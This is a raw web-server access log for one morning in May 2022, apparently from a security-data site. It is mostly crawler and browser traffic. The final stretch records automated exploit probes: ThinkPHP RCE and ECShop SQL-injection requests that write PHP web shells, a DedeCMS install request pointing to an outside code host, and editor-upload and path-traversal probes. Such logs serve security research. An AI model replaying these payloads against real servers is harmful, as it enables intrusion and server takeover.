115.135.141.247 - - [15/May/2022:03:58:19 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
115.135.141.247 - - [15/May/2022:03:58:20 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 328 "-" "Safari/15610.3.7.1.10 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)" 
115.135.141.247 - - [15/May/2022:03:58:20 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 305 "-" "Safari/15610.3.7.1.10 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)" 
115.135.141.247 - - [15/May/2022:03:58:20 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "-" "Safari/15610.3.7.1.10 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)" 
115.135.141.247 - - [15/May/2022:03:58:21 -0700] "GET / HTTP/1.1" 200 13160 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" 
115.135.141.247 - - [15/May/2022:03:58:21 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 305 "-" "Safari/15610.3.7.1.10 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)" 
115.135.141.247 - - [15/May/2022:03:58:21 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 305 "-" "Safari/15610.3.7.1.10 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)" 
115.135.141.247 - - [15/May/2022:04:01:57 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
115.135.141.247 - - [15/May/2022:04:01:57 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 328 "-" "Safari/15610.3.7.1.10 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)" 
115.135.141.247 - - [15/May/2022:04:01:57 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 305 "-" "Safari/15610.3.7.1.10 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)" 
115.135.141.247 - - [15/May/2022:04:01:58 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" 
115.135.141.247 - - [15/May/2022:04:01:58 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 305 "-" "Safari/15610.3.7.1.10 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)" 
115.135.141.247 - - [15/May/2022:04:01:58 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 305 "-" "Safari/15610.3.7.1.10 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)" 
49.7.20.111 - - [15/May/2022:04:04:26 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.21.88 - - [15/May/2022:04:08:13 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
148.251.179.145 - - [15/May/2022:04:10:57 -0700] "HEAD /robots.txt HTTP/1.1" 200 314 "-" "DomCopBot (https://www.domcop.com/bot)" 
74.125.215.64 - - [15/May/2022:04:17:45 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "-" "Mozilla/5.0 (compatible; GoogleSites)" 
74.125.215.93 - - [15/May/2022:04:21:19 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "-" "Mozilla/5.0 (compatible; GoogleSites)" 
157.55.39.153 - - [15/May/2022:04:29:53 -0700] "GET /self.logs/ HTTP/1.1" 200 36121 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
49.7.20.111 - - [15/May/2022:04:31:06 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.105 - - [15/May/2022:04:34:07 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.105 - - [15/May/2022:04:37:34 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
66.249.64.83 - - [15/May/2022:04:38:44 -0700] "GET /ads.txt HTTP/1.1" 301 489 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.111 - - [15/May/2022:04:38:45 -0700] "GET /ads.txt HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
49.7.20.105 - - [15/May/2022:04:40:20 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.105 - - [15/May/2022:04:43:26 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.21.88 - - [15/May/2022:04:44:03 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.105 - - [15/May/2022:04:46:45 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.105 - - [15/May/2022:04:50:08 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
115.231.149.58 - - [15/May/2022:04:53:04 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15" 
115.231.149.58 - - [15/May/2022:04:53:05 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15" 
115.231.149.58 - - [15/May/2022:04:53:05 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15" 
51.222.253.4 - - [15/May/2022:04:53:51 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/loaded_scripts.html HTTP/1.1" 200 1499 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
49.7.20.105 - - [15/May/2022:04:54:31 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.105 - - [15/May/2022:05:00:39 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
5.102.173.71 - - [15/May/2022:05:06:25 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; MojeekBot/0.11; +https://www.mojeek.com/bot.html)" 
5.102.173.71 - - [15/May/2022:05:06:25 -0700] "GET /self.logs/2016/?C=S;O=D HTTP/1.1" 200 8369 "-" "Mozilla/5.0 (compatible; MojeekBot/0.11; +https://www.mojeek.com/bot.html)" 
49.7.20.105 - - [15/May/2022:05:10:10 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.149.228 - - [15/May/2022:05:17:18 -0700] "GET /self.logs/access.log.2020-11-09.gz HTTP/1.1" 200 20910 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
51.222.253.13 - - [15/May/2022:05:17:19 -0700] "GET /self.logs/access.log.2022-05-11.gz HTTP/1.1" 200 12212 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
118.113.1.165 - - [15/May/2022:05:18:22 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
49.7.20.111 - - [15/May/2022:05:18:51 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.140.174 - - [15/May/2022:05:27:24 -0700] "GET /self.logs/2016/error.log.2016-01-22 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs/2016/?C=S%3BO%3DA" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.20.105 - - [15/May/2022:05:28:19 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
42.106.237.63 - - [15/May/2022:05:36:17 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4711.0 Safari/537.36" 
42.106.237.63 - - [15/May/2022:05:36:17 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4711.0 Safari/537.36" 
42.106.237.63 - - [15/May/2022:05:36:18 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4711.0 Safari/537.36" 
42.106.237.63 - - [15/May/2022:05:36:18 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4711.0 Safari/537.36" 
42.106.237.63 - - [15/May/2022:05:36:18 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4711.0 Safari/537.36" 
42.106.237.63 - - [15/May/2022:05:36:18 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4711.0 Safari/537.36" 
114.119.140.174 - - [15/May/2022:05:37:39 -0700] "GET /self.logs/error.log.2018-04-09.gz HTTP/1.1" 200 5577 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.21.88 - - [15/May/2022:05:38:07 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
51.222.253.9 - - [15/May/2022:05:40:20 -0700] "GET /self.logs/error.log.2022-05-11.gz HTTP/1.1" 200 1095 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
157.55.39.153 - - [15/May/2022:05:43:20 -0700] "GET /self.logs/ HTTP/1.1" 200 36138 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.125 - - [15/May/2022:05:46:03 -0700] "GET /self.logs/access.log.2022-04-27.gz HTTP/1.1" 200 11933 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
114.119.149.218 - - [15/May/2022:05:48:03 -0700] "GET /self.logs/error.log.2019-10-14.gz HTTP/1.1" 200 871 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
157.55.39.65 - - [15/May/2022:05:49:51 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/dns.html HTTP/1.1" 200 1830 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
118.113.1.165 - - [15/May/2022:05:50:11 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
207.46.13.196 - - [15/May/2022:06:07:39 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
49.7.20.111 - - [15/May/2022:06:08:17 -0700] "GET / HTTP/1.1" 200 13145 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
180.101.45.115 - - [15/May/2022:06:10:19 -0700] "GET / HTTP/1.1" 200 49089 "-" "-" 
207.46.13.196 - - [15/May/2022:06:12:18 -0700] "GET / HTTP/1.1" 200 13182 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
178.63.69.12 - - [15/May/2022:06:20:02 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; Birdcrawlerbot/0.5; +https://crawla.de)" 
178.63.69.12 - - [15/May/2022:06:20:03 -0700] "GET / HTTP/1.1" 200 49089 "-" "Mozilla/5.0 (compatible; Birdcrawlerbot/0.5; +https://crawla.de)" 
49.7.21.88 - - [15/May/2022:06:26:39 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.149.228 - - [15/May/2022:06:29:20 -0700] "GET /self.logs/error.log.2019-08-28.gz HTTP/1.1" 200 2816 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
3.90.30.61 - - [15/May/2022:06:31:56 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 56420944 "-" "curl/7.79.1" 
171.212.241.86 - - [15/May/2022:06:32:36 -0700] "GET / HTTP/1.1" 200 13182 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
171.212.241.86 - - [15/May/2022:06:32:37 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 328 "-" "Safari%E6%B5%8F%E8%A7%88%E5%99%A8/16613.1.17.1.13 CFNetwork/1240.0.4 Darwin/20.6.0" 
171.212.241.86 - - [15/May/2022:06:32:37 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 305 "-" "Safari%E6%B5%8F%E8%A7%88%E5%99%A8/16613.1.17.1.13 CFNetwork/1240.0.4 Darwin/20.6.0" 
171.212.241.86 - - [15/May/2022:06:32:38 -0700] "GET / HTTP/1.1" 200 13182 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1" 
171.212.241.86 - - [15/May/2022:06:32:39 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 305 "-" "Safari%E6%B5%8F%E8%A7%88%E5%99%A8/16613.1.17.1.13 CFNetwork/1240.0.4 Darwin/20.6.0" 
171.212.241.86 - - [15/May/2022:06:32:39 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 305 "-" "Safari%E6%B5%8F%E8%A7%88%E5%99%A8/16613.1.17.1.13 CFNetwork/1240.0.4 Darwin/20.6.0" 
157.55.39.153 - - [15/May/2022:06:32:44 -0700] "GET /self.logs/access.log.2017-12-24.gz HTTP/1.1" 200 15398 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
185.191.171.40 - - [15/May/2022:06:45:23 -0700] "GET /Datasets%20Description/Network/ssl.html HTTP/1.1" 200 1548 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
114.119.145.137 - - [15/May/2022:06:49:57 -0700] "GET /self.logs/error.log.2018-07-14.gz HTTP/1.1" 200 51960 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.20.111 - - [15/May/2022:06:52:24 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
157.55.39.153 - - [15/May/2022:06:56:07 -0700] "GET /self.logs/ HTTP/1.1" 200 36138 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
114.119.140.174 - - [15/May/2022:07:00:11 -0700] "GET /self.logs/2016/access.log.2016-10-26.gz HTTP/1.1" 200 11082 "http://www.secrepo.com/self.logs/2016/?C=S%3BO%3DA" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
173.252.107.20 - - [15/May/2022:07:00:32 -0700] "GET /self.logs HTTP/1.1" 301 526 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" 
173.252.107.20 - - [15/May/2022:07:00:32 -0700] "GET /self.logs/ HTTP/1.1" 200 36101 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" 
173.252.87.3 - - [15/May/2022:07:00:33 -0700] "GET /self.logs/?fbclid=IwAR3J-pKJvYezI5N4vAtkj9hrbM5iHUzPISCSdVg7v3nZr0vGROjGZEyiT1I HTTP/1.1" 200 36138 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1" 
173.252.107.19 - - [15/May/2022:07:00:33 -0700] "GET /self.logs/ HTTP/1.1" 200 36101 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" 
69.171.251.19 - - [15/May/2022:07:05:33 -0700] "GET /self.logs/?fbclid=IwAR2z8xP1tGgJO2dKnt0knT--wVW798RYlM7QcVO32Objd-b96PVQd1N20N4 HTTP/1.1" 200 36138 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1" 
114.119.149.237 - - [15/May/2022:07:10:17 -0700] "GET /self.logs/2016/access.log.2016-11-04.gz HTTP/1.1" 200 9414 "http://www.secrepo.com/self.logs/2016/?C=S%3BO%3DA" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.21.88 - - [15/May/2022:07:10:21 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
69.171.251.11 - - [15/May/2022:07:10:33 -0700] "GET /self.logs/?fbclid=IwAR3ZoBITiH18FxYzrRcMpc1PmBHwRTBwbHRwZB2mKEshtOEFyjFx4-x_hDU HTTP/1.1" 200 36138 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1" 
23.247.108.39 - - [15/May/2022:07:10:44 -0700] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 284 "www.secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
23.247.108.39 - - [15/May/2022:07:10:55 -0700] "POST /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=uckxd.php&updateHost=http://2.bj33.cc/ HTTP/1.1" 404 328 "http://www.secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=uckxd.php&updateHost=http://2.bj33.cc/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
23.247.108.39 - - [15/May/2022:07:11:08 -0700] "POST /Ueditor/controller.ashx?action=catchimage HTTP/1.1" 404 284 "www.secrepo.com/Ueditor/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" 
69.171.251.21 - - [15/May/2022:07:15:33 -0700] "GET /self.logs/?fbclid=IwAR2l74eGEmuP3_3qqT44IJxJazVCmxtH6pwHFHIBbZhDSdBYHl8ID8lUano HTTP/1.1" 200 36138 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1" 
1.71.130.215 - - [15/May/2022:07:18:20 -0700] "GET /e/data/js/ajax.js HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
114.119.140.174 - - [15/May/2022:07:20:25 -0700] "GET /self.logs/error.log.2017-11-12.gz HTTP/1.1" 200 1846 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
123.125.109.44 - - [15/May/2022:07:22:40 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
103.205.211.115 - - [15/May/2022:07:26:05 -0700] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 509 "secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.205.211.115 - - [15/May/2022:07:26:06 -0700] "GET /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 328 "secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.205.211.115 - - [15/May/2022:07:26:06 -0700] "POST /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=tabym.php&updateHost=http://2.bj33.cc/ HTTP/1.1" 301 709 "http://secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=tabym.php&updateHost=http://2.bj33.cc/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:07:26:07 -0700] "POST /Ueditor/controller.ashx?action=catchimage HTTP/1.1" 301 501 "secrepo.com/Ueditor/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" 
103.205.211.115 - - [15/May/2022:07:26:08 -0700] "GET /Ueditor/controller.ashx?action=catchimage HTTP/1.1" 404 328 "secrepo.com/Ueditor/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" 
103.205.211.115 - - [15/May/2022:07:26:09 -0700] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 509 "secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.205.211.115 - - [15/May/2022:07:26:09 -0700] "GET /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 305 "secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.205.211.115 - - [15/May/2022:07:26:09 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 301 691 "http://secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:07:26:09 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 301 690 "http://secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:07:26:10 -0700] "GET /user.php?act=login HTTP/1.1" 301 510 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:07:26:10 -0700] "POST /fdgq.php HTTP/1.1" 301 490 "http://secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:07:26:10 -0700] "GET /index.php HTTP/1.1" 301 492 "http://secrepo.com/index.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:07:26:10 -0700] "GET /index.php/user.php?act=login HTTP/1.1" 301 530 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:07:26:11 -0700] "POST /index.php/ysyqq.php HTTP/1.1" 301 512 "http://secrepo.com/index.php/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:07:26:11 -0700] "GET /index.php/e/aspx/upload.aspx?a=pageadmin_cms HTTP/1.1" 301 562 "http://secrepo.com/index.php/e/aspx/upload.aspx?a=pageadmin_cms" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:07:26:11 -0700] "GET /index.php/index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 301 598 "http://secrepo.com/index.php/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:07:26:11 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=tkwnf.php&vars%5B1%5D%5B%5D=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37$ HTTP/1.1" 301 904 "http://secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=tkwnf.php&vars[1][]=<?php assert($_REQUEST[\"ysy\"]);?>ysydjsjxbei37$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:07:26:12 -0700] "GET /tkwnf.php HTTP/1.1" 301 492 "http://secrepo.com/tkwnf.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:07:26:12 -0700] "GET /index.php/seeyon/thirdpartyController.do.css/..;/ajax.do HTTP/1.1" 301 586 "http://secrepo.com/index.php/seeyon/thirdpartyController.do.css/..;/ajax.do" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
